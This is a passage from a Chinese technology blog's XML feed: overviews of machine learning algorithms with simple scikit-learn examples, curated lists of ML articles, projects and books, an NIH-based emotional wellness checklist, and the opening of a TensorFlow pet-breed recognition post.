Machine,SVM)支持向量机/网络算法(SVM)属于分类型算法。SVM模型将实例表示为空间中的点，将使用一条直线分隔数据点。需要注意的是，支持向量机需要对输入数据进行完全标记，仅直接适用于两类任务，应用将多类任务需要减少到几个二元问题。 1234567891011121314151617181920from sklearn import svm, datasets#digit dataset from sklearndigits = datasets.load_digits()#create the Support Vector Classifierclf = svm.SVC(gamma = 0.001, C = 100)#set training setx, y = digits.data[:-1], digits.target[:-1]#train modelclf.fit(x, y)#predicty_pred = clf.predict([digits.data[-1]])y_true = digits.target[-1]print(y_pred)print(y_true) 3. 最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN)KNN算法是一种基于实例的学习，或者是局部近似和将所有计算推迟到分类之后的惰性学习。用最近的邻居（k）来预测未知数据点。k 值是预测精度的一个关键因素，无论是分类还是回归，衡量邻居的权重都非常有用，较近邻居的权重比较远邻居的权重大。 KNN 算法的缺点是对数据的局部结构非常敏感。计算量大，需要对数据进行规范化处理，使每个数据点都在相同的范围。 12345678910111213141516171819202122from sklearn import datasetsfrom sklearn.neighbors import KNeighborsClassifier#digit dataset from sklearndigits = datasets.load_digits()#create the KNeighborsClassifierclf = KNeighborsClassifier(n_neighbors=6)#set training setx, y = digits.data[:-1], digits.target[:-1]#train modelclf.fit(x, y)#predicty_pred = clf.predict([digits.data[-1]])y_true = digits.target[-1]print(y_pred)print(y_true) 延伸：KNN 的一个缺点是依赖于整个训练数据集，学习向量量化（Learning Vector Quantization，LVQ)是一种监督学习的人神经网络算法，允许你选择训练实例。LVQ 由数据驱动，搜索距离它最近的两个神经元，对于同类神经元采取拉拢，异类神经元采取排斥，最终得到数据的分布模式。如果基于 KNN 可以获得较好的数据集分类效果，利用 LVQ 可以减少存储训练数据集存储规模。典型的学习矢量量化算法有LVQ1、LVQ2和LVQ3，尤以LVQ2的应用最为广泛。 4. 逻辑回归算法 Logistic Regression逻辑回归算法（Logistic Regression）一般用于需要明确输出的场景，如某些事件的发生（预测是否会发生降雨）。通常，逻辑回归使用某种函数将概率值压缩到某一特定范围。例如，Sigmoid 函数（S 函数）是一种具有 S 形曲线、用于二元分类的函数。它将发生某事件的概率值转换为 0, 1 的范围表示。 Y = E ^（b0＋b1 x）/（1 + E ^（b0＋b1 x ）） 以上是一个简单的逻辑回归方程，B0，B1是常数。这些常数值将被计算获得，以确保预测值和实际值之间的误差最小。 5. 决策树算法 Decision Tree决策树（Decision tree）是一种特殊的树结构，由一个决策图和可能的结果（例如成本和风险）组成，用来辅助决策。机器学习中，决策树是一个预测模型，树中每个节点表示某个对象，而每个分叉路径则代表某个可能的属性值，而每个叶节点则对应从根节点到该叶节点所经历的路径所表示的对象的值。决策树仅有单一输出，通常该算法用于解决分类问题。 一个决策树包含三种类型的节点： 决策节点：通常用矩形框来表示 机会节点：通常用圆圈来表示 终结点：通常用三角形来表示 简单决策树算法案例，确定人群中谁喜欢使用信用卡。考虑人群的年龄和婚姻状况，如果年龄在30岁或是已婚，人们更倾向于选择信用卡，反之则更少。通过确定合适的属性来定义更多的类别，可以进一步扩展此决策树。在这个例子中，如果一个人结婚了，他超过30岁，他们更有可能拥有信用卡（100% 偏好）。测试数据用于生成决策树。 注意：对于那些各类别样本数量不一致的数据，在决策树当中信息增益的结果偏向于那些具有更多数值的特征。 Introduction to Decision Tree ThunderGBM：快成一道闪电的梯度提升决策树 | 机器之心 3月7日 6. k-平均算法 K-Meansk-平均算法(K-Means)是一种无监督学习算法，为聚类问题提供了一种解决方案。K-Means 算法把 n 个点（可以是样本的一次观察或一个实例）划分到 k 个集群（cluster），使得每个点都属于离他最近的均值（即聚类中心，centroid）对应的集群。重复上述过程一直持续到重心不改变。 7. 随机森林算法 Random Forest随机森林算法（Random Forest）的名称由 1995 年由贝尔实验室提出的random decision forests 而来，正如它的名字所说的那样，随机森林可以看作一个决策树的集合。随机森林中每棵决策树估计一个分类，这个过程称为“投票（vote）”。理想情况下，我们根据每棵决策树的每个投票，选择最多投票的分类。 PaperRandom Forest |Leo Breiman | Statistics Department University of California Berkeley 8. 朴素贝叶斯算法 Naive Bayes朴素贝叶斯算法（Naive Bayes）基于概率论的贝叶斯定理，应用非常广泛，从文本分类、垃圾邮件过滤器、医疗诊断等等。朴素贝叶斯适用于特征之间的相互独立的场景，例如利用花瓣的长度和宽度来预测花的类型。“朴素”的内涵可以理解为特征和特征之间独立性强。 与朴素贝叶斯算法密切相关的一个概念是最大似然估计(Maximum likelihood estimation)，历史上大部分的最大似然估计理论也都是在贝叶斯统计中得到大发展。例如，建立人口身高模型，很难有人力与物力去统计全国每个人的身高，但是可以通过采样，获取部分人的身高，然后通过最大似然估计来获取分布的均值与方差。 Naive Bayes is called naive because it assumes that each input variable is independent. 9. 降维算法 Dimensional Reduction在机器学习和统计学领域，降维是指在限定条件下，降低随机变量个数，得到一组“不相关”主变量的过程，并可进一步细分为特征选择和特征提取两大方法。 一些数据集可能包含许多难以处理的变量。特别是资源丰富的情况下，系统中的数据将非常详细。在这种情况下，数据集可能包含数千个变量，其中大多数变量也可能是不必要的。在这种情况下，几乎不可能确定对我们的预测影响最大的变量。此时，我们需要使用降维算法，降维的过程中也可能需要用到其他算法，例如借用随机森林，决策树来识别最重要的变量。 10. 梯度增强算法 Gradient Boosting梯度增强算法（Gradient Boosting）使用多个弱算法来创建更强大的精确算法。它与使用单个估计量不同，而是使用多个估计量创建一个更稳定和更健壮的算法。梯度增强算法有几种： XGBoost — 使用线性和树算法 LightGBM — 只使用基于树的算法梯度增强算法的特点是精度较高。此外，LightGBM 算法具有令人难以置信的高性能。 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 媒体报道|经济学人：What are algorithms? A Tour of The Top 10 Algorithms for Machine Learning Newbies 维基百科：监督学习 AI工程师基础能力：机器学习 | InfoQ Reinforcement Learning 强化学习 Python 3 教你看懂各种神经网络 神经网络架构 微软Azure算法图表 SAS算法图表 算法总结http://thinkbigdata.in/best-known-machine-learning-algorithms-infographic/) 算法的优劣对比]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI技术原理|推荐文献]]></title>
    <url>%2F2018%2F02%2F09%2FMachine-Learning-Articles%2F</url>
    <content type="text"><![CDATA[摘要 机器学习参考文集 Machine Learning 资讯 | 基于深度学习识别姑息治疗患者 Machine Learning Top Articles “Hiring a Machine Learning engineer or Data Scientist in Silicon Valley is becoming like hiring a professional athlete. That’s how demanding it is” — The New York Times Popular Ai Articles: A noob’s guide to implementing RNN-LSTM using Tensorflow Keras Cheat Sheet: Neural Networks in Python Making a Simple Neural Network Machine Learning Top Articles Learn to Build a Machine Learning Application from Top Articles of 2017 Paper TensorFlow:Large-Scale Machine Learning on Heterogeneous Distributed Systems (Preliminary White Paper, November 9, 2015) 分类 图像处理 Image Manipulation 风格转换 Style Transfer 图像分类 Image Classification 脸部识别 Face Recognition 视频稳定化 Video Stabilization 目标检测 Object Detection 自动驾驶汽车 Self Driving Car 智能推荐 Recommendation Al 智能游戏 Gaming Al 智能下棋 Chess Al 智能医学 Medical Al 智能演说 Speech Al 智能音乐 Music Al 自然语言处理 Natural Language Processing 智能预测 Prediction Mybridge AI 在 20000 篇关于创建机器学习应用的文章中挑选了前 50 名。从有实践经验的数据科学家那里学习是一个好方法，我们可以的分享中获得构建、运营机器学习应用的经验教训。50 篇文章大致可以分为 15 个主题，如下所示： Recommended Learning The Beginner’s Guide to Building an Artificial Intelligence in Unity. Deep Learning and Computer Vision A-Z™: Learn OpenCV, SSD &amp; GANs and create image recognition apps. 图像处理 Image Manipulation High-Resolution Image Synthesis and Semantic Manipulation with Conditional GANs Using Deep Learning to Create Professional-Level Photographs High Dynamic Range (HDR) Imaging using OpenCV (Python) 风格转换 Style Transfer Visual Attribute Transfer through Deep Image Analogy Deep Photo Style Transfer: A deep-learning approach to photographic style transfer that handles a large variety of image content while faithfully transferring the reference style Deep Image Prior 图像分类 Image Classification Feature Visualization: How neural networks build up their understanding of images An absolute beginner’s guide to Image Classification with Neural Networks Background removal with deep learning 人脸识别 Face Recognition Large Pose 3D Face Reconstruction from a Single Image via Direct Volumetric CNN Regression Eye blink detection with OpenCV, Python, and dlib DEAL WITH IT in Python with Face Detection 视频稳定化 Video Stabilization Fused Video Stabilization on the Pixel 2 and Pixel 2 XL 目标检测 Object Detection How HBO’s Silicon Valley built “Not Hotdog” with mobile TensorFlow, Keras &amp; React Native Object detection: an overview in the age of Deep Learning How to train your own Object Detector with TensorFlow’s Object Detector API Real-time object detection with deep learning and OpenCV 自动驾驶汽车 Self Driving Car Self-driving Grand Theft Auto V with Python : Intro [Part I] - Sentdex Recognizing Traffic Lights With Deep Learning: How I learned deep learning in 10 weeks and won $5,000 智能推荐 Recommendation AI Spotify’s Discover Weekly: How machine learning finds your new music Artwork Personalization at Netflix 智能游戏 Gaming AI MariFlow - Self-Driving Mario Kart w/Recurrent Neural Network OpenAI Baselines: DQN. Reproduce reinforcement learning algorithms with performance on par with published results. Reinforcement Learning on Dota 2 [Part II] Creating an AI DOOM bot Phase-Functioned Neural Networks for Character Control The Game Imitation: Deep Supervised Convolutional Networks for Quick Video Game AI - Stanford University Introducing: Unity Machine Learning Agents – Unity Blog 智能下棋 Chess AI Mastering Chess and Shogi by Self-Play with a General Reinforcement Learning Algorithm AlphaGo Zero: Learning from scratch | DeepMind How Does DeepMind’s AlphaGo Zero Work? A step-by-step guide to building a simple chess AI 智能医学 Medical AI CheXNet: Radiologist-Level Pneumonia Detection on Chest X-Rays with Deep Learning Can you improve lung cancer detection? 2nd place solution for the Data Science Bowl 2017. Improving Palliative Care with Deep Learning - Andrew Ng Heart Disease Diagnosis with Deep Learning 基于深度学习识别姑息治疗患者Stanford ML Group 建立了一个使用深度学习算法的程序，根据电子健康记录（Electronic Health Record ，EHR，包括病历、心电图、医疗影像等信息）数据确定在未来3-12个月高风险死亡的住院患者。这些病人的预警信息将发送给姑息治疗小组，这有助于姑息护理小组尽早介入、提供服务。 姑息治疗（Palliative Care ，在日本、中国台湾翻译为舒缓医学）起源于 hospice运动，最早起源于公元四世纪。根据世界卫生组织的定义，姑息治疗强调控制疼痛及患者有关症状，并对心理、社会和精神问题予以重视，目的是为病人和家属赢得最好的生活质量。 预测模型是一个 18 层的深度神经网络，输入参数为一个病人的 EHR 数据，输出为未来 3-12 个月死亡的概率。训练数据采用斯坦福医院 EHR 数据库中的历史数据，包含超过 200 万名患者的数据。EHR 数据包括患者过去 12 个月的诊断结论、治疗程序、处方和相关细节（经过脱敏和技术处理，以替代码的形式表示），所有数据被转换成 13654 维的特征向量。训练好的模型 AUROC 评分达到 0.93 ，交叉验证的平均精度为0.69 分。 对于机器学习系统来说，使用户可以根据预测结果采取行动，需要提供预测结果的详细解释，这点对于建立用户信心至关重要。Stanford 的程序可以自动生成一个报告，在病人的 EHR 数据中高亮突出对于预测结果具有重要影响因子的条目。 智能演说 Speech AI Tacotron: A Fully End-to-End Text-To-Speech Synthesis Model - Data Scientists at Google Sequence Modeling with CTC Deep Voice: Real-time Neural Text-to-Speech - Baidu Silicon Valley AI Lab Deep Learning for Siri’s Voice: On-device Deep Mixture Density Networks for Hybrid Unit Selection Synthesis - Apple 智能音乐 Music AI Computer evolves to generate baroque music! Make your own music with WaveNets: Making a Neural Synthesizer Instrument 自然语言处理 Natural Language Processing Learning to communicate: Agents developing their own language - OpenAI Research Big Picture Machine Learning: Classifying Text with Neural Networks and TensorFlow A novel approach to neural machine translation - Facebook AI Research How to make a racist AI without really trying 预测 Prediction Using Machine Learning to Predict Value of Homes On Airbnb Engineering Uncertainty Estimation in Neural Networks for Time Series Prediction at Uber Using Machine Learning to make parking easier How to Predict Stock Prices Easily - Intro to Deep Learning #7 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI技术原理|机器学习开源项目]]></title>
    <url>%2F2018%2F02%2F09%2FMachine-Learning-Projects%2F</url>
    <content type="text"><![CDATA[摘要 来源：30 Amazing Machine Learning Projects for the Past Year (v.2018) 评选：Mybridge AI 数据：从 8800 个机器学习领域开源项目中选取 Top 30 (0.3%)，Github 平均关注数 3558。 Machine Learning Project CheckList Frame the Problem and Look at the Big Picture Get the Data Explore the Data Prepare the Data Short-List Promising Models Fine-Tune the System Present Your Solution NO.1 FastText [11786 stars]FastText: 文本表示和分类库（representation &amp; classification）贡献者：Facebook Research No.2 Deep-photo-styletransfer [9747 stars]Deep-photo-styletransfer: 论文 “Deep Photo Style Transfer” 的源代码和数据贡献者：Fujun Luan, 康奈尔大学（Cornell University）Ph.D No.3 face_recognition [8672 stars]face_recognition: 脸部识别 API （facial recognition），支持 Python 编程接口贡献者：Adam Geitgey No.4 Magenta [8113 stars]Magenta: 基于机器智能生成音乐和艺术作品 No.5 Sonnet [5731 stars]Sonnet: 基于 TensorFlow 的神经网络库贡献者：Malcolm Reynolds at Deepmind No.6 deeplearn.js [5462 stars]deeplearn.js: 一个面向 Web 的 JavaScript 库，提供硬件加速能力，支持在浏览器中训练神经网络，或者使用已经训练好的模型。贡献者：Nikhil Thorat at Google Brain No.7 fast-style-transfer [4843 stars]fast-style-transfer：基于 TensorFlow，Fast Style Transfer贡献者：Logan Engstrom at MIT No.8 Pysc2 [3683 stars]Pysc2: StarCraft II Learning Environment .贡献者：Timo Ewalds at DeepMind No.9 AirSim [3861 stars]AirSim: 基于 微软（AI &amp; Research）自主驾驶汽车虚拟引擎的开源模拟器贡献者：Shital Shah at Microsoft No.10 Facets [3371 stars]Facets: 机器学习数据集可视化贡献者：Google Brain No.11 Style2Paints [3310 stars]Style2Paints: 图像智能化 No.12 Tensor2Tensor [3087 stars]Tensor2Tensor: 广义顺序序列模型库（sequence to sequence models）贡献者：Ryan Sepassi at Google Brain No.13 pytorch-CycleGAN-and-pix2pix [2847 stars]pytorch-CycleGAN-and-pix2pix：图像翻译 （Image-to-image）， in PyTorch (horse2zebra, edges2cats)贡献者：Jun-Yan Zhu, Ph.D at Berkeley No.14 Faiss [2629 stars]Faiss: 相似性搜索和稠密矢量聚类库 （efficient similarity search &amp; clustering of dense vectors）贡献者：Facebook Research No.15 Fashion-mnist [2780 stars]Fashion-mnist: 类似 MNIST 风格的时尚产品数据库（MNIST：Mixed National Institute of Standards and Technology database)贡献者：Han Xiao, Research Scientist Zalando Tech No.16 ParlAI [2578 stars]ParlAI: 一个基于各种公开可用的对话数据集训练和评估 AI 模型的框架贡献者：Alexander Miller at Facebook Research No.17 Fairseq [2571 stars]Fairseq: 来自 Facebook AI Research 的 Sequence-to-Sequence 工具库 No.18 Pyro [2387 stars]Pyro: 基于 Python 和 Pytorch 的通用深度学习编程接口贡献者：Uber AI Labs No.19 [2369 stars]iGAN: 基于 GAN (生成对抗网络)实现交互式图像生成 No.20 Deep-image-prior [2188 stars]Deep-image-prior: 基于神经网络实现图像修复，非监督学习方式贡献者：Dmitry Ulyanov, Ph.D at Skoltech （斯科尔科沃，俄罗斯“硅谷”） No.21 Face_classification [1967 stars]Face_classification:实时人脸检测与情感/性别识别，使用fer2013/imdb 数据集，基于 Keras CNN 模型和 OpenCV。 No.22 Speech-to-Text-WaveNet [1961 stars]Speech-to-Text-WaveNet : 英语语言识别，基于 DeepMind 的 WaveNet 和 Tensorflow。DeepMind：一家英国人工智能公司。创建于2010年，2014年被谷歌收购。WaveNet is a deep neural network for generating raw audio.贡献者：Namju Kim at Kakao Brain No.23 StarGAN [1954 stars]StarGAN: 用于多域图像到图像转换的统一生成对抗网络贡献者：Yunjey Choi ，高丽大学（ Korea University ） No.24 Ml-agents [1658 stars]Ml-agents: 统一机器学习代理贡献者：Arthur Juliani, Deep Learning at Unity3D No.25 DeepVideoAnalytics [1494 stars]DeepVideoAnalytics: 分布式可视化搜索与数据分析平台贡献者：Akshay Bhat, 康奈尔大学（ Cornell University ）Ph.D No.26 OpenNMT [1490 stars]OpenNMT: 利用 Torch 数学工具包的开源神经机器翻译系统 OpenNMT site Building a Translation System In Minutes | Using OpenNMT-py to create baseline NMT models No.27 Pix2pixHD [1283 stars]Pix2pixHD: 合成和操纵 2048x1024 图像，基于条件式对抗生成网络（Conditional GAN）贡献者：Ming-Yu Liu at AI Research Scientist at Nvidia No.28 Horovod [1188 stars]Horovod: 面向 TensorFlow 的分布式训练框架贡献者：Uber Engineering No.29 AI-Blocks [899 stars]AI-Blocks: 一个强大的图形化机器学习模型编辑器，基于Tensorflow 和 Python。 No.30 deep-voice-conversion [845 stars]deep-voice-conversion: 支持语音转换的深度神经网络（声音风格转换），基于 Tensorflow贡献者：Dabi Ahn, AI Research at Kakao Brain 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 深度学习在IoT大数据和流分析中的应用|InfoQ 腾讯冯牮：基于卷积神经网络在手机端实现文档检测 | 2017-10-03 QCon InfoQ]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数学工具指南]]></title>
    <url>%2F2018%2F02%2F02%2FMathmetics-Tools%2F</url>
    <content type="text"><![CDATA[摘要 公式排版（LaTeX） 公式图形化（GeoGebra） 数据结构可视化 公式排版（LaTeX） LaTeX Atom plugin : markdown-preview-enhanced macOS 矢量作图小贴士 Mathpix：将图像转换为 LaTeX 公式图形化 Geogebra Bomb250@从gnuplot到GeoGebra的艰难之旅 数据结构可视化 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（八）Program,Data and Classical Music 参考文献 制作优雅数据表格 | Small Guide to Making Nice Tables 分数线分割的式子字体缩小问题&amp;积分号太短的问题:将表达式中的\frac换成\dfrac即可，这里的d的意思是displaystyle]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI技术原理|推荐书单]]></title>
    <url>%2F2018%2F01%2F25%2FMachine-Learning-Books%2F</url>
    <content type="text"><![CDATA[摘要 Background 统计学 | Statistics Machine learning Deep learning Background 吴军|《数学之美》 《黑客与画家》 在线学习项目 Fast.ai: 创始人 杰里米·霍华德（Jeremy Howard）、雷切尔·托马斯（Rachel Thomas） deeplearning.ai 统计学 | Statistics An Introduction to Statistical Learning with Applications in R The Elements of Statistical Learning:Data Mining, Inference, and Prediction. Statistical Computing for Scientists and Engineers | University of Notre Dame, Fall 2017 Probability Theory (For Scientists and Engineers) Michael Betancourt | April 2018 课程 | 深度学习 A Beginner’s Guide to the Mathematics of Neural Networks UC Berkeley CS 294深度强化学习课程（附视频与PPT）(Eng) 推荐书单 《深度学习》|原作名: Deep Learning: Adaptive Computation and Machine Learning series 《机器学习导论（原书第3版）》 《Deep Learning》| Josh Patterson 《概率编程实战》 《Hands-On Machine Learning with Scikit-Learn and TensorFlow》 《Machine Learning in Action | 机器学习实战》 中译 python-lang English Building a Neural Net from Scratch in Go | Daniel Whitenack TensorFlow 谷歌云官方：一小时掌握深度学习和 TensorFlow（视频+50PPT）2017-01-24 新智元 Google 制作的节奏紧凑、内容实用的机器学习简介课程 | 使用 TensorFlow API 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 统计建模与机器学习的区别:Oliver Schabenberger是商业分析与商业智能软件SAS的副总裁，Analytic Server的研发主管，他还是美国统计协会ASA的会士。]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[医学常识|情绪健康检查表]]></title>
    <url>%2F2018%2F01%2F22%2FHealth-Emotional%2F</url>
    <content type="text"><![CDATA[摘要 情绪健康检查表 Emotional Wellness Checklist This article is part of an Work Life Balance tutorial series. Make sure to check out my other articles as well: IT 工程师养生指南 医学常识| NIH 情绪健康检查单 Preview How Helping Others Can Relieve Anxiety and Depression |New research shows one more way that compassion is beneficial.|Posted Oct 10, 2017compassionate goals were associated with lower levels of symptoms and less relationship conflict. 情绪健康检查表 Emotional wellness is the ability to successfully handle life’s stresses and adapt to change and difficult times. 情绪健康是成功地处理生活压力和适应变化和困难时期的能力。 前景乐观专家说，情绪健康的人消极情绪少，能更快地从困难中恢复过来。这种品质叫做弹性（ resilience ）。情绪健康的另一个标志是能够持久保持积极情绪、欣赏美好时光。 培养更积极的心态： 记住你的善行。 原谅你自己。 多花点时间和朋友在一起。 探索你对人生意义和人生目标的信念。 养成健康的生活习惯。 减少压力每个人都不时感到压力。压力会在你最需要的时候给你一股能量。但是，如果压力持续很长一段时间被称为慢性应激，“高度警惕”的变化变得有害无益。学习应对压力的方法也能增强你的韧性。 管理你的压力: 充足的睡眠。 经常锻炼。 建立一个社会支持网络。 设置优先级。 积极思考。 尝试放松。 寻求帮助。 提高睡眠质量为了完成我们今天想做的每一件事，我们经常牺牲睡眠。但是睡眠对身心健康都有影响。这一点对你的幸福至关重要。当你处于疲劳状态的时候不能发挥最佳效能。睡眠有助于你更清晰地思考，更快的反应和更好的集中注意力。采取措施确保你有规律的睡个好觉。 获得更好的睡眠质量： 每天按时上床睡觉 &amp; 起床。 在黑暗、安静的地方睡觉。 每天锻炼。 限制使用电子产品。 睡前放松。 避免在白天晚些时候饮酒、吸烟和刺激物质。 如果你有持续的睡眠问题请咨询健康专家。 正念正念的概念很简单。这个古老的实践是关于完全意识到正在发生的一切，内在的一切和周围发生的一切。这意味着不要把生活当成“自动驾驶”，成为一个更加用心的人需要承诺和实践。下面是一些帮助你入门的技巧。 To be more mindful： 用鼻子深呼吸，数到4，保持1秒钟，然后通过嘴呼气数到5。经常重复。 漫步，留心、欣赏周围的风景。 练习正念饮食。用心去体会对食物的渴望，进食时身体的感觉。 在你的本地社区找到正念资源，包括课程、计划或书籍。 应对亲人/爱人逝去当你所爱的人死了，你的世界就会改变。没有绝对正确或错误的悼念方式。虽然亲人的去世会让人感到难以忍受，但大多数人都能在家人和朋友的支持下度过悲痛的过程。学习一些健康的方法帮助你度过困难时期。 以下措施有助于应对爱人逝去： 照顾好自己。 和一个关心你的朋友谈谈。 不要马上做任何重大的改变。 加入悲伤支持小组。 考虑专业支持。 如果你在日常活动中遇到困难，可以和你的医生谈谈。 耐心点。度过悲痛需要时间。 加强社会联系社会关系可能有助于保护健康和延长寿命。科学家们发现，我们与他人的联系可以对我们的身心健康产生强大的影响。无论是与浪漫的伴侣、家人、朋友、邻居或其他人，社会关系都会影响我们的生物和幸福。 构建健康的社会支持系统： 与你的孩子建立牢固的关系。 积极行动建立与家人和朋友分享的良好习惯。 如果你是家庭照顾者，学会向别人寻求帮助。 加入一个专注于自己喜爱的爱好的团体，如阅读、远足或绘画。 加入一个课程，学点新东西。 在社区里做一些你关心的事情，比如社区花园、学校、图书馆或礼拜场所。 到不同的地方去结识新朋友。 Emotional Wellness ChecklistBRIGHTEN YOUR OUTLOOKPeople who are emotionally well, experts say, have fewer negative emotions and are able to bounce back from difficulties faster. This quality is called resilience. Another sign of emotional wellness is being able to hold onto positive emotions longer and appreciate the good times. To develop a more positive mindset: Remember your good deeds. Forgive yourself. Spend more time with your friends. Explore your beliefs about the meaning and purpose of life. Develop healthy physical habits. REDUCE STRESSEveryone feels stressed from time to time. Stress can give you a rush of energy when it’s needed most. But if stress lasts a long time—a condition known as chronic stress—those “high alert” changes become harmful rather than helpful. Learning healthy ways to cope with stress can also boost your resilience. To help manage your stress Get enough sleep. Exercise regularly. Build a social support network. Set priorities. Think positive. Try relaxation methods. Seek help. GET QUALITY SLEEPTo fit in everything we want to do in our day, we often sacrifice sleep. But sleep affects both mental and physical health. It’s vital to your well-being. When you’re tired, you can’t function at your best. Sleep helps you think more clearly, have quicker reflexes and focus better. Take steps to make sure you regularly get a good night’s sleep. To get better quality sleep: Go to bed and get up each day at the same time. Sleep in a dark, quiet place. Exercise daily. Limit the use of electronics. Relax before bedtime. Avoid alcohol, nicotine, &amp; stimulants late in the day. Consult a health care professional if you have ongoing sleep problems. BE MINDFULThe concept of mindfulness is simple. This ancient practice is about being completely aware of what’s happening in the present—of all that’s going on inside and all that’s happening around you. It means not living your life on “autopilot.” Becoming a more mindful person requires commitment and practice. Here are some tips to help you get started. To be more mindful: Take some deep breaths in through your nose to a count of 4, hold for 1 second and then exhale through the mouth to a count of 5. Repeat often. Enjoy a stroll and notice the sights around you. Practice mindful eating. Be aware of each bite and when you’re full. Find mindfulness resources in your local community, including classes, programs, or books. COPE WITH LOSSWhen someone you love dies, your world changes. There is no right or wrong way to mourn. Although the death of a loved one can feel overwhelming, most people can make it through the grieving process with the support of family and friends. Learn healthy ways to help you through difficult times. To help cope with loss: Take care of yourself. Talk to a caring friend. Try not to make any major changes right away. Join a grief support group. Consider professional support. Talk to your doctor if you’re having trouble with everyday activities. Be patient. Mourning takes time. STRENGTHEN SOCIAL CONNECTIONSSocial connections might help protect health and lengthen life. Scientists are finding that our links to others can have powerful effects on our health—both emotionally and physically. Whether with romantic partners, family, friends, neighbors, or others, social connections can influence our biology and well-being. To build healthy support systems: Build strong relationships with your kids. Get active and share good habits with family and friends. If you’re a family caregiver, ask for help from others. Join a group focused on a favorite hobby, such as reading, hiking, or painting. Take a class to learn something new. Volunteer for things you care about in your community, like a community garden, school, library, or place of worship. Travel to different places and meet new people. 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)医学常识| NIH 情绪健康检查单参考文献 Emotional Wellness Toolkit]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Health</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别]]></title>
    <url>%2F2018%2F01%2F17%2FMachine-Learning-TensorFlow%2F</url>
    <content type="text"><![CDATA[摘要 Machine Learning Workflow Problem: 宠物分类、勋章识别、美女打分 Demo: Hello TensorFlow ! TensorFlow C library / Go binding Machine Learning Workflow Define the problem. What problems do you want to solve? Start simple. Be familiar with the data and the baseline results. Then try something more complicated. Problem人类喜欢将所有事物都纳入鄙视链的范畴，宠物当然也不例外。一般来说，拥有一只纯种宠物可以让主人占据鄙视链的云端，进而鄙视那些混血或者流浪宠物。甚至还发展出了专业的鉴定机构，可以颁发《血统证明书》。但是考究各类纯种鉴定的常规方法，主要标准是眼睛的大小、颜色、鼻子的特点、身躯长度、尾巴特征、毛发等特征，当然也包括一些比较玄幻的属性，例如宠物家族的个性、气质等等。 外军研究：美军授勋及嘉奖制度观察一文中提到，世界各国军队都有自己的制服、军衔、勋章体系，它们既是军人荣誉的体现，也包含了丰富的职业信息。但是体系过于庞大也会带来识别困难，例如下图中的两位美军士兵，是否可以有一种方案可以自动、准确地识别各类徽章的意义呢？ 中文网络上有一个特殊名词：颜值。通常用来表示人物颜容英俊或靓丽的数值。人们希望有一个衡量标准可以用来评价、测量和比较人物容貌，许多社交软件甚至可以利用计算机视觉识别技术分析颜值、年龄、性别，甚至与好友一起进行颜值 PK ，当然这些软件的 “颜值” 算法总是备受争议。 